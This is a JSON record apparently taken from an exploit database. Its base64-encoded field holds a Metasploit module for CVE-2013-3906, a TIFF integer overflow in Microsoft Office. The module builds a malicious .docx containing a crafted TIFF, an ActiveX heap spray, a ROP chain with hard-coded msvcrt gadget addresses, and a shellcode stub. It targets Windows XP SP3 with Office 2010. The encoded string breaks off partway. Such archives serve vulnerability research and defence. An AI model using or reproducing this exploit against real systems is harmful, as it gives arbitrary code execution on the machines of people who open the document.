{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KcmVxdWlyZSAncmV4L3ppcCcNCnJlcXVpcmUgJ25va29naXJpJw0KDQptb2R1bGUgOjpOb2tvZ2lyaQ0KbW9kdWxlIFhNTA0KICBjbGFzcyBCdWlsZGVyDQogICAgIw0KICAgICMgU29tZSBYTUwgZG9jdW1lbnRzIGRvbid0IGRlY2xhcmUgdGhlIG5hbWVzcGFjZSBiZWZvcmUgcmVmZXJlbmNpbmcsIGJ1dCBOb2tvZ2lyaSByZXF1aXJlcyBvbmUuDQogICAgIyBTbyBoZXJlJ3Mgb3VyIGhhY2sgdG8gZ2V0IGFyb3VuZCB0aGF0IGJ5IGFkZGluZyBhIG5ldyBjdXN0b20gbWV0aG9kIHRvIHRoZSBCdWlsZGVyIGNsYXNzDQogICAgIw0KICAgIGRlZiBjdXN0b21fcm9vdChucykNCiAgICAgIGUgPSBAcGFyZW50LmNyZWF0ZV9lbGVtZW50KG5zKQ0KICAgICAgZS5hZGRfbmFtZXNwYWNlX2RlZmluaXRpb24obnMsICJocmVmIikNCiAgICAgIEBucyA9IGUubmFtZXNwYWNlX2RlZmluaXRpb25zLmZpbmQgeyB8eHwgeC5wcmVmaXggPT0gbnMudG9fcyB9DQogICAgICByZXR1cm4gc2VsZg0KICAgIGVuZA0KICBlbmQNCmVuZA0KZW5kDQoNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gQXZlcmFnZVJhbmtpbmcNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RklMRUZPUk1BVA0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6Um9wRGINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgID0+ICJNaWNyb3NvZnQgVGFnZ2VkIEltYWdlIEZpbGUgRm9ybWF0IChUSUZGKSBJbnRlZ2VyIE92ZXJmbG93IiwNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB2dWxuZXJhYmlsaXR5IGZvdW5kIGluIE1pY3Jvc29mdCdzIFRhZ2dlZCBJbWFnZSBGaWxlIEZvcm1hdC4NCiAgICAgICAgICBJdCB3YXMgb3JpZ2luYWxseSBkaXNjb3ZlcmVkIGluIHRoZSB3aWxkLCB0YXJnZXRpbmcgV2luZG93cyBYUCBhbmQgV2luZG93cyBTZXJ2ZXIgMjAwMw0KICAgICAgICAgIHVzZXJzIHJ1bm5pbmcgTWljcm9zb2Z0IE9mZmljZSwgc3BlY2lmaWNhbGx5IGluIHRoZSBNaWRkbGUgRWFzdCBhbmQgU291dGggQXNpYSByZWdpb24uDQoNCiAgICAgICAgICBUaGUgZmxhdyBpcyBkdWUgdG8gYSBEV09SRCB2YWx1ZSBleHRyYWN0ZWQgZnJvbSB0aGUgVElGRiBmaWxlIHRoYXQgaXMgZW1iZWRkZWQgYXMgYQ0KICAgICAgICAgIGRyYXdpbmcgaW4gTWljcm9zb2Z0IE9mZmljZSwgYW5kIGhvdyBpdCBnZXRzIGNhbGN1bGF0ZWQgd2l0aCB1c2VyLWNvbnRyb2xsZWQgaW5wdXRzLA0KICAgICAgICAgIGFuZCBzdG9yZWQgaW4gdGhlIEVBWCByZWdpc3Rlci4gVGhlIDMyLWJpdCByZWdpc3RlciB3aWxsIHJ1biBvdXQgb2Ygc3RvcmFnZSBzcGFjZSB0bw0KICAgICAgICAgIHJlcHJlc2VudCB0aGUgbGFyZ2UgdmxhdWUsIHdoaWNoIGVuZHMgdXAgYmVpbmcgMCwgYnV0IGl0IHN0aWxsIGdldHMgcHVzaGVkIGFzIGENCiAgICAgICAgICBkd0J5dGVzIGFyZ3VtZW5ldCAoc2l6ZSkgZm9yIGEgSGVhcEFsbG9jIGNhbGwuIFRoZSBIZWFwQWxsb2MgZnVuY3Rpb24gd2lsbCBhbGxvY2F0ZSBhDQogICAgICAgICAgY2h1bmsgYW55d2F5IHdpdGggc2l6ZSAwLCBhbmQgdGhlIGFkZHJlc3Mgb2YgdGhpcyBjaHVuayBpcyB1c2VkIGFzIHRoZSBkZXN0aW5hdGlvbiBidWZmZXINCiAgICAgICAgICBvZiBhIG1lbWNweSBmdW5jdGlvbiwgd2hlcmUgdGhlIHNvdXJjZSBidWZmZXIgaXMgdGhlIEVYSUYgZGF0YSAoYW4gZXh0ZW5kZWQgaW1hZ2UgZm9ybWF0DQogICAgICAgICAgc3VwcG9ydGVkIGJ5IFRJRkYpLCBhbmQgaXMgYWxzbyB1c2VyLWNvbnRyb2xsZWQuIEEgZnVuY3Rpb24gcG9pbnRlciBpbiB0aGUgY2h1bmsgcmV0dXJuZWQNCiAgICAgICAgICBieSBIZWFwQWxsb2Mgd2lsbCBlbmQgdXAgYmVpbmcgb3ZlcndyaXR0ZW4gYnkgdGhlIG1lbWNweSBmdW5jdGlvbiwgYW5kIHRoZW4gbGF0ZXIgdXNlZA0KICAgICAgICAgIGluIE9HTCFHZGlwQ3JlYXRlUGF0aC4gQnkgc3VjY2Vzc2Z1bGx5IGNvbnRyb2xsaW5nIHRoaXMgZnVuY3Rpb24gcG9pbnRlciwgYW5kIHRoZQ0KICAgICAgICAgIG1lbW9yeSBsYXlvdXQgdXNpbmcgQWN0aXZlWCwgaXQgaXMgcG9zc2libGUgdG8gZ2FpbiBhcmJpdHJhcnkgY29kZSBleGVjdXRpb24gdW5kZXIgdGhlDQogICAgICAgICAgY29udGV4dCBvZiB0aGUgdXNlci4NCiAgICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnQXV0aG9yJyAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnVW5rbm93bicsICMgU29tZSBkdWRlIHdyb3RlIGl0IGFuZCBkZXBsb3llZCBpbiB0aGUgd2lsZCwgYnV0IEhhaWZlaSBMaSBzcG90dGVkIGl0DQogICAgICAgICAgJ3Npbm4zcicgICAjIE1ldGFzcGxvaXQNCiAgICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0NWRScsICcyMDEzLTM5MDYnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvc2VjdXJpdHkvYWR2aXNvcnkvMjg5NjY2NicgXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2Ivc3JkL2FyY2hpdmUvMjAxMy8xMS8wNS9jdmUtMjAxMy0zOTA2LWEtZ3JhcGhpY3MtdnVsbmVyYWJpbGl0eS1leHBsb2l0ZWQtdGhyb3VnaC13b3JkLWRvY3VtZW50cy5hc3B4JyBdDQogICAgICAgIF0sDQogICAgICAnUGF5bG9hZCcgICAgICAgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnUHJlcGVuZEVuY29kZXInID0+ICJceDY0XHhhMVx4MThceDAwXHgwMFx4MDAiICsgIyBtb3YgZWF4LCBmczpbMHgxOF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJceDgzXHhDMFx4MDgiICAgICAgICAgICAgICsgIyBhZGQgZWF4LCBieXRlIDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJceDhiXHgyMCIgICAgICAgICAgICAgICAgICsgIyBtb3YgZXNwLCBbZWF4XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx4ODFceEM0XHgzMFx4RjhceEZGXHhGRiIsICAjIGFkZCBlc3AsIC0yMDAwDQogICAgICAgICAgJ0JhZENoYXJzJyAgICAgICA9PiAiXHgwMCINCiAgICAgICAgfSwNCiAgICAgICdEZWZhdWx0T3B0aW9ucycgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnRXhpdEZ1bmN0aW9uJyA9PiAicHJvY2VzcyIsDQogICAgICAgICAgJ1ByZXBlbmRNaWdyYXRlJyA9PiB0cnVlDQogICAgICAgIH0sDQogICAgICAnUGxhdGZvcm0nICAgICAgID0+ICd3aW4nLA0KICAgICAgJ1RhcmdldHMnICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgIyBYUCBTUDMgKyBPZmZpY2UgMjAxMCBTdGFuZGFyZCAoMTQuMC42MDIzLjEwMDAgMzItYml0KQ0KICAgICAgICAgIFsnV2luZG93cyBYUCBTUDMgd2l0aCBPZmZpY2UgU3Rhcm5kYXJkIDIwMTAnLCB7fV0sDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiTm92IDUgMjAxMyIsICMgTWljcm9zb2Z0IGFubm91bmNlbWVudA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCg0KICAgICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgICAgWw0KICAgICAgICAgIE9wdFN0cmluZy5uZXcoJ0ZJTEVOQU1FJywgW3RydWUsICdUaGUgZG9jeCBmaWxlJywgJ21zZi5kb2N4J10pLA0KICAgICAgICBdLCBzZWxmLmNsYXNzKQ0KICBlbmQNCg0KICAjDQogICMgQ3JlYXRlcyBhIFRJRkYgdGhhdCB0cmlnZ2VycyB0aGUgb3ZlcmZsb3cNCiAgIw0KICBkZWYgbWFrZV90aWZmDQogICAgIyBUSUZGIEhlYWRlcjoNCiAgICAjIFRJRkYgSUQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSAnSUknIChJbnRlbCBvcmRlcikNCiAgICAjIFRJRkYgVmVyc2lvbiAgICAgICAgICAgICAgICAgICAgICAgICAgPSA0MmQNCiAgICAjIE9mZnNldCBvZiBGSUQgICAgICAgICAgICAgICAgICAgICAgICAgPSAweDAwMDA0OWM4aA0KICAgICMNCiAgICAjIEltYWdlIERpcmVjdG9yeToNCiAgICAjIE51bWJlciBvZiBlbnRyaWVzICAgICAgICAgICAgICAgICAgICAgPSAxN2QNCiAgICAjIEVudHJ5WzBdICBOZXdTdWJGaWxlVHlwZSAgICAgICAgICAgICAgPSAwDQogICAgIyBFbnRyeVsxXSAgSW1hZ2VXaWR0aCAgICAgICAgICAgICAgICAgID0gMjU2ZA0KICAgICMgRW50cnlbMl0gIEltYWdlSGVpZ2h0ICAgICAgICAgICAgICAgICA9IDMzOGQNCiAgICAjIEVudHJ5WzNdICBCaXRzUGVyU2FtcGxlICAgICAgICAgICAgICAgPSA4IDggOA0KICAgICMgRW50cnlbNF0gIENvbXByZXNzaW9uICAgICAgICAgICAgICAgICA9IEpQRUcgKDYpDQogICAgIyBFbnRyeVs1XSAgUGhvdG9tZXRyaWMgSW50ZXJwcmV0YXRpb24gID0gUkdQDQogICAgIyBFbnRyeVs2XSAgU3RyaXBPZmZzZXRzICAgICAgICAgICAgICAgID0gNjggZW50cmllcyAoMzQ5IGJ5dGVzKQ0KICAgICMgRW50cnlbN10gIFNhbXBsZXNQZXJQaXhlbCAgICAgICAgICAgICA9IDMNCiAgICAjIEVudHJ5WzhdICBSb3dzUGVyU3RyaXAgICAgICAgICAgICAgICAgPSA1DQogICAgIyBFbnRyeVs5XSAgU3RyaXBCeXRlQ291bnRzICAgICAgICAgICAgID0gNjggZW50cmllcyAoMjc4IGJ5dGVzKQ0KICAgICMgRW50cnlbMTBdIFhSZXNvbHV0aW9uICAgICAgICAgICAgICAgICA9IDk2ZA0KICAgICMgRW50cnlbMTFdIFlSZXNvbHV0aW9uICAgICAgICAgICAgICAgICA9IDk2ZA0KICAgICMgRW50cnlbMTJdIFBsYW5hciBDb25maWd1cmF0aW9uICAgICAgICA9IENsdW5reQ0KICAgICMgRW50cnlbMTNdIFJlc29sdXRpb24gVW5pdCAgICAgICAgICAgICA9IEluY2gNCiAgICAjIEVudHJ5WzE0XSBQcmVkaWN0b3IgICAgICAgICAgICAgICAgICAgPSBOb25lDQogICAgIyBFbnRyeVsxNV0gSlBFR0ludGVyY2hhbmdlRm9ybWF0TGVuZ3RoID0gNTI1MmggKDE0ODRoKQ0KICAgICMgRW50cnlbMTZdIEpQRUdJbnRlcmNoYW5nZUZvcm1hdCAgICAgICA9IDEzNjM2ZA0KDQogICAgIyBOb3RlczoNCiAgICAjIFRoZXNlIHZhbHVlcyBhcmUgZXh0cmFjdGVkIGZyb20gdGhlIGZpbGUgdG8gY2FsY3VsYXRlIHRoZSBIZWFwQWxsb2Mgc2l6ZSB0aGF0IHJlc3VsdCBpbiB0aGUgb3ZlcmZsb3c6DQogICAgIyAtIEpQRUdJbnRlcmNoYW5nZUZvcm1hdExlbmd0aA0KICAgICMgLSBEV09SRCBhdCBvZmZzZXQgMzMyNGggKDB4ZmZmZmI4OTgpLCBubyBkb2N1bWVudGF0aW9uIGZvciB0aGlzDQogICAgIyAtIERXT1JEUyBhZnRlciBvZmZzZXQgMzMyOGgsIG5vIGRvY3VtZW50YXRpb24gZm9yIHRoZXNlLCBlaXRoZXIuDQogICAgIyBUaGUgRFdPUkQgYXQgb2Zmc2V0IDQ4NzRoIGlzIHdoYXQgZW5kcyB1cCBvdmVyd3JpdGluZyB0aGUgZnVuY3Rpb24gcG9pbnRlciBieSB0aGUgbWVtY3B5DQogICAgIyBUaGUgdHJpZ2dlciBpcyByZWFsbHkgYSBUSUYgZmlsZSwgYnV0IGlzIG5hbWVkIGFzIGEgSlBFRyBpbiB0aGUgZG9jeCBwYWNrYWdlDQoNCiAgICBidWYgPSAnJw0KICAgIHBhdGggPSA6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImV4cGxvaXRzIiwgIkNWRS0yMDEzLTM5MDYiLCAid29yZCIsICJtZWRpYSIsICJpbWFnZTEuanBlZyIpDQogICAgOjpGaWxlLm9wZW4ocGF0aCwgInJiIikgZG8gfGZ8DQogICAgICBidWYgPSBmLnJlYWQNCiAgICBlbmQNCg0KICAgICMgR2FpbiBjb250cm9sIG9mIHRoZSBjYWxsIFtlYXgrNTBoXSBpbnN0cnVjdGlvbg0KICAgICMgWENIRyBFQVgsIEVTUDsgUkVUTiBtc3ZjcnQNCiAgICBidWZbMHg0ODc0LCA0XSA9IFsweDIwMEYwNzAwLTB4NTBdLnBhY2soJ1YnKQ0KDQogICAgYnVmDQogIGVuZA0KDQoNCiAgIw0KICAjIEdlbmVyYXRlcyBhIHBheWxvYWQNCiAgIw0KICBkZWYgZ2V0X3JvcF9wYXlsb2FkDQogICAgcCA9ICcnDQogICAgcCA8PCBbMHg3N2MxNWVkNV0ucGFjaygnVicpICMgWENIRyBFQVgsIEVTUCAgbXN2Y3J0DQogICAgcCA8PCBnZW5lcmF0ZV9yb3BfcGF5bG9hZCgnbXN2Y3J0JywnJyx7J3RhcmdldCc9Pid4cCd9KQ0KICAgIHAgPDwgcGF5bG9hZC5lbmNvZGVkDQogICAgYmxvY2sgID0gcA0KICAgIGJsb2NrIDw8IHJhbmRfdGV4dF9hbHBoYSgxMDI0IC0gODAgLSBwLmxlbmd0aCkNCiAgICBibG9jayA8PCBbIDB4NzdjMzRmYmYsIDB4MjAwZjA3MDQgXS5wYWNrKCJWIikgIyBwb3AgZXNwICMgcmV0ICMgZnJvbSBtc3ZjcnQNCiAgICBibG9jayA8PCByYW5kX3RleHRfYWxwaGEoMTAyNCAtIGJsb2NrLmxlbmd0aCkNCg0KICAgIGJ1ZiA9ICcnDQogICAgd2hpbGUgKGJ1Zi5sZW5ndGggPCAweDgwMDAwKQ0KICAgICAgYnVmIDw8IGJsb2NrDQogICAgZW5kDQoNCiAgICBidWYNCiAgZW5kDQoNCg0KICAjDQogICMgQ3JlYXRlcyBhbiBBY3RpdmVYIGJpbiB0aGF0IHdpbGwgYmUgdXNlZCBhcyBhIHNwcmF5IGluIE9mZmljZQ0KICAjDQogIGRlZiBtYWtlX2FjdGl2ZXhfYmluDQogICAgIw0KICAgICMgSG93IGFuIEFjdGl2ZVggYmluIGlzIHJlZmVycmVkOg0KICAgICMgZG9jdW1lbnQueG1sLnJlbHMgLT4gQWN0aXZlWFtudW1dLnhtbCAtPiBhY3RpdmVYW251bV0ueG1sLnJlbHMgLT4gQWN0aXZlWFtudW1dLmJpbg0KICAgICMgRXZlcnkgYmluIGlzIGEgTWljcm9zb2Z0IENvbXBvdW5kIERvY3VtZW50IEZpbGU6DQogICAgIyBodHRwOi8vd3d3Lm9wZW5vZmZpY2Uub3JnL3NjL2NvbXBkb2NmaWxlZm9ybWF0LnBkZg0KDQogICAgIyBUaGUgYmluIGZpbGUNCiAgICBtc2NkICA9ICcnDQogICAgbXNjZCA8PCBbMHhlMDExY2ZkMF0ucGFjaygnVicpICAgICAgIyBGaWxlIGlkZW50aWZpZXIgKGZpcnN0IDQgYnl0ZSkNCiAgICBtc2NkIDw8IFsweGUxMWFiMWExXS5wYWNrKCdWJykgICAgICAjIEZpbGUgaWRlbnRpZmllciAoc2Vjb25kIDQgYnl0ZSkNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAwXS5wYWNrKCdWJykgKiA0ICAjIFVuaXF1ZSBJZGVudGlmaWVyDQogICAgbXNjZCA8PCBbMHgwMDNlXS5wYWNrKCd2JykgICAgICAgICAgIyBSZXZpc2lvbiBudW1iZXINCiAgICBtc2NkIDw8IFsweDAwMDNdLnBhY2soJ3YnKSAgICAgICAgICAjIFZlcnNpb24gbnVtYmVyDQogICAgbXNjZCA8PCBbMHhmZmZlXS5wYWNrKCd2JykgICAgICAgICAgIyBCeXRlIG9yZGVyOiBMaXR0bGUtRW5kaWFuDQogICAgbXNjZCA8PCBbMHgwMDA5XS5wYWNrKCd2JykgICAgICAgICAgIyBTZWN0b3Igc2l6ZQ0KICAgIG1zY2QgPDwgWzB4MDAwNl0ucGFjaygndicpICAgICAgICAgICMgU2l6ZSBvZiBhIHNob3J0LXNlY3Rvcg0KICAgIG1zY2QgPDwgIlx4MDAiICogMTAgICAgICAgICAgICAgICAgICMgTm90IHVzZWQNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAxXS5wYWNrKCdWJykgICAgICAjIFRvdGFsIG51bWJlciBvZiBzZWN0b3JzDQogICAgbXNjZCA8PCBbMHgwMDAwMDAwMV0ucGFjaygnVicpICAgICAgIyBTZWNJRCBmb3IgdGhlIGZpcnN0IHNlY3Rvcg0KICAgIG1zY2QgPDwgWzB4MDAwMDAwMDBdLnBhY2soJ1YnKSAgICAgICMgTm90IHVzZWQNCiAgICBtc2NkIDw8IFsweDAwMDAxMDAwXS5wYWNrKCdWJykgICAgICAjIE1pbmltdW0gc2l6ZSBvZiBhIHN0YW5kYXJkIHN0cmVhbQ0KICAgIG1zY2QgPDwgWzB4MDAwMDAwMDJdLnBhY2soJ1YnKSAgICAgICMgU2VjIElEIG9mIGZpcnN0IHNlY3Rvcg0KICAgIG1zY2QgPDwgWzB4MDAwMDAwMDFdLnBhY2soJ1YnKSAgICAgICMgVG90YWwgbnVtYmVyIG9mIHNlY3RvcnMgZm9yIHRoZSBzaG9ydC1zZWN0b3IgdGFibGUNCiAgICBtc2NkIDw8IFsweGZmZmZmZmZlXS5wYWNrKCdWJykgICAgICAjIFNlY0lEIG9mIGZpcnN0IHNlY3RvciBvZiB0aGUgbWFzdHNlciBzZWN0b3IgdGFibGUNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAwXS5wYWNrKCdWJykgICAgICAjIFRvdGFsIG51bWJlciBvZiBzZWN0b3JzIGZvciBtYXN0ZXIgc2VjdG9yIHRhbGJlDQogICAgbXNjZCA8PCBbMHgwMDAwMDAwMF0ucGFjaygnVicpICAgICAgIyBTZWNJRHMNCiAgICBtc2NkIDw8IFsweGZmZmZmZmZmXS5wYWNrKCdWJykgKiA0ICogNTkgIyBTZWNJRHMNCiAgICBtc2NkWzB4MjAwLCA0XSAgPSBbMHhmZmZmZmZmZF0ucGFjaygnVicpDQogICAgbXNjZFsweDIwNCwgMTJdID0gWzB4ZmZmZmZmZmVdLnBhY2soJ1YnKSAqIDMNCiAgICBtc2NkIDw8IFJleDo6VGV4dC50b191bmljb2RlKCJSb290IEVudHJ5IikNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAwXS5wYWNrKCdWJykgKiAxMQ0KICAgIG1zY2QgPDwgWzB4MDAxNl0ucGFjaygndicpICAgICAgICAgICMgVmFsaWQgcmFuZ2Ugb2YgdGhlIHByZXZpb3VzIGNoYXIgYXJyYXkNCiAgICBtc2NkIDw8ICJceDA1IiAgICAgICAgICAgICAgICAgICAgICAjIFR5cGUgb2YgZW50cnkgKFJvb3QgU3RvcmFnZSBFbnRyeSkNCiAgICBtc2NkIDw8ICJceDAwIiAgICAgICAgICAgICAgICAgICAgICAjIE5vZGUgY29sb3VyIG9mIHRoZSBlbnRyeSAocmVkKQ0KICAgIG1zY2QgPDwgWzB4ZmZmZmZmZmZdLnBhY2soJ1YnKSAgICAgICMgRGlySUQgb2YgdGhlIGxlZnQgY2hpbGQgbm9kZQ0KICAgIG1zY2QgPDwgWzB4ZmZmZmZmZmZdLnBhY2soJ1YnKSAgICAgICMgRGlySUQgb2YgdGhlIHJpZ2h0IGNoaWxkIG5vZGUNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAxXS5wYWNrKCdWJykgICAgICAjIERpcklEIG9mIHRoZSByb290IG5vZGUgZW50cnkNCiAgICBtc2NkIDw8IFsweDFlZmI2NTk2XS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweDExZDE4NTdjXS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweGMwMDA2YWIxXS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweDI4MzYyOGYwXS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAwXS5wYWNrKCdWJykgKiAzDQogICAgbXNjZCA8PCBbMHgyODdlMzA3MF0ucGFjaygnVicpDQogICAgbXNjZCA8PCBbMHgwMWNlMjY1NF0ucGFjaygnVicpDQogICAgbXNjZCA8PCBbMHgwMDAwMDAwM10ucGFjaygnVicpDQogICAgbXNjZCA8PCBbMHgwMDAwMDEwMF0ucGFjaygnVicpDQogICAgbXNjZCA8PCBbMHgwMDAwMDAwMF0ucGFjaygnVicpDQogICAgbXNjZCA8PCBSZXg6OlRleHQudG9fdW5pY29kZSgiQ29udGVudHMiKQ0KICAgIG1zY2QgPDwgWzB4MDAwMDAwMDBdLnBhY2soJ1YnKSAqIDEyDQogICAgbXNjZCA8PCBbMHgwMTAyMDAxMl0ucGFjaygnVicpDQogICAgbXNjZCA8PCBbMHhmZmZmZmZmZl0ucGFjaygnVicpICogMw0KICAgIG1zY2QgPDwgWzB4MDAwMDAwMDBdLnBhY2soJ1YnKSAqIDEwDQogICAgbXNjZCA8PCBbMHgwMDAwMDBlNF0ucGFjaygnVicpDQogICAgbXNjZCA8PCBbMHgwMDAwMDAwMF0ucGFjaygnVicpICogMTgNCiAgICBtc2NkIDw8IFsweGZmZmZmZmZmXS5wYWNrKCdWJykgKiAzDQogICAgbXNjZCA8PCBbMHgwMDAwMDAwMF0ucGFjaygnVicpICogMjkNCiAgICBtc2NkIDw8IFsweGZmZmZmZmZmXS5wYWNrKCdWJykgKiAzDQogICAgbXNjZCA8PCBbMHgwMDAwMDAwMF0ucGFjaygnVicpICogMTINCiAgICBtc2NkIDw8IFsweDAwMDAwMDAxXS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAyXS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweDAwMDAwMDAzXS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweGZmZmZmZmZlXS5wYWNrKCdWJykNCiAgICBtc2NkIDw8IFsweGZmZmZmZmZmXS5wYWNrKCdWJykgKiAzMiAjNTINCiAgICBtc2NkIDw8IFsweDc3YzM0ZmJmXS5wYWNrKCdWJykgIyBQT1AgRVNQICMgUkVUTg0KICAgIG1zY2QgPDwgWzB4MjAwZjA3MDRdLnBhY2soJ1YnKSAjIEZpbmFsIHBheWxvYWQgdGFyZ2V0IGFkZHJlc3MgdG8gYmVnaW4gdGhlIFJPUA0KICAgIG1zY2QgPDwgWzB4ZmZmZmZmZmZdLnBhY2soJ1YnKSAqIDE4DQogICAgbXNjZCA8PCBAcm9wX3BheWxvYWQNCg0KICAgIG1zY2QNCiAgZW5kDQoNCg0KICAjDQogICMgQ3JlYXRlcyBhbiBhY3RpdmVYW251bV0ueG1sIGZpbGUNCiAgIyBAcGFyYW0gcmlkIFtTdHJpbmddIFRoZSByZWxhdGlvbnNoaXAgSUQgKGV4YW1wbGU6IHJJZDEpDQogICMgQHJldHVybiBbU3RyaW5nXSBYTUwgZG9jdW1lbnQNCiAgIw0KICBkZWYgbWFrZV9hY3RpdmV4X3htbChyaWQpDQogICAgYXR0cnMgPSB7DQogICAgICAnYXg6Y2xhc3NpZCcgICAgID0+ICJ7MUVGQjY1OTYtODU3Qy0xMUQxLUIxNkEtMDBDMEYwMjgzNjI4fSIsDQogICAgICAnYXg6bGljZW5zZScgICAgID0+ICI5MzY4MjY1RS04NUZFLTExZDEtOEJFMy0wMDAwRjg3NTREQTEiLA0KICAgICAgJ2F4OnBlcnNpc3RlbmNlJyA9PiAicGVyc2lzdFN0b3JhZ2UiLA0KICAgICAgJ3I6aWQnICAgICAgICAgICA9PiAicklkI3tyaWQudG9fc30iLA0KICAgICAgJ3htbG5zOmF4JyAgICAgICA9PiAiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9vZmZpY2UvMjAwNi9hY3RpdmVYIiwNCiAgICAgICd4bWxuczpyJyAgICAgICAgPT4gQHNjaGVtYQ0KICAgIH0NCiAgICBtZCA9IDo6Tm9rb2dpcmk6OlhNTCgiPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwiVVRGLThcIiBzdGFuZGFsb25lPVwibm9cIj8+IikNCiAgICBidWlsZGVyID0gOjpOb2tvZ2lyaTo6WE1MOjpCdWlsZGVyLndpdGgobWQpIGRvIHx4bWx8DQogICAgICB4bWwuY3VzdG9tX3Jvb3QoImF4IikNCiAgICAgIHhtbC5vY3goYXR0cnMpDQogICAgZW5kDQoNCiAgICBidWlsZGVyLnRvX3htbCg6aW5kZW50ID0+IDApDQogIGVuZA0KDQoNCiAgIw0KICAjIENyZWF0ZXMgYW4gYWN0aXZlWFtudW1dLnhtbC5yZWxzDQogICMgQHBhcmFtIHJlbGF0aW9uc2hpcHMgW0FycmF5XSBBIGNvbGxlY3Rpb24gb2YgaGFzaGVzIHdpdGggZWFjaCBjb250YWluaW5nOg0KICAjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOmlkLCA6dHlwZSwgOnRhcmdldA0KICAjIEByZXR1cm4gW1N0cmluZ10gWE1MIGRvY3VtZW50DQogICMNCiAgZGVmIG1ha2VfYWN0aXZleF94bWxfcmVhbHMocmlkLCB0YXJnZXRfYmluKQ0KICAgIGFjeF90eXBlID0gImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vb2ZmaWNlLzIwMDYvcmVsYXRpb25zaGlwcy9hY3RpdmVYQ29udHJvbEJpbmFyeSINCiAgICBtZCA9IDo6Tm9rb2dpcmk6OlhNTCgiPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwiVVRGLThcIiBzdGFuZGFsb25lPVwieWVzXCI/PiIpDQogICAgYnVpbGRlciA9IDo6Tm9rb2dpcmk6OlhNTDo6QnVpbGRlci53aXRoKG1kKSBkbyB8eG1sfA0KICAgIHhtbC5SZWxhdGlvbnNoaXBzKCd4bWxucyc9PiJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvcGFja2FnZS8yMDA2L3JlbGF0aW9uc2hpcHMiKSBkbw0KICAgICAgICB4bWwuUmVsYXRpb25zaGlwKHs6SWQ9PiJySWQje3JpZC50b19zfSIsIDpUeXBlPT5hY3hfdHlwZSwgOlRhcmdldD0+dGFyZ2V0X2Jpbn0pDQogICAgZW5kDQogICAgZW5kDQoNCiAgICBidWlsZGVyLnRvX3htbCg6aW5kZW50ID0+IDApDQogIGVuZA0KDQogICMNCiAgIyBDcmVhdGVzIGEgZG9jdW1lbnQueG1sLnJlYWxzIGZpbGUNCiAgIyBAcGFyYW0gcmVsYXRpb25zaGlwcyBbQXJyYXldIEEgY29sbGVjdGlvbiBvZiBoYXNoZXMgd2l0aCBlYWNoIGNvbnRhaW5pbmc6DQogICMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6aWQsIDp0eXBlLCBhbmQgOnRhcmdldA0KICAjIEByZXR1cm4gW1N0cmluZ10gWE1MIGRvY3VtZW50DQogICMNCiAgZGVmIG1ha2VfZG9jX3htbF9yZWFscyhyZWxhdGlvbnNoaXBzKQ0KICAgIG1kID0gOjpOb2tvZ2lyaTo6WE1MKCI8P3htbCB2ZXJzaW9uPVwiMS4wXCIgZW5jb2Rpbmc9XCJVVEYtOFwiIHN0YW5kYWxvbmU9XCJ5ZXNcIj8+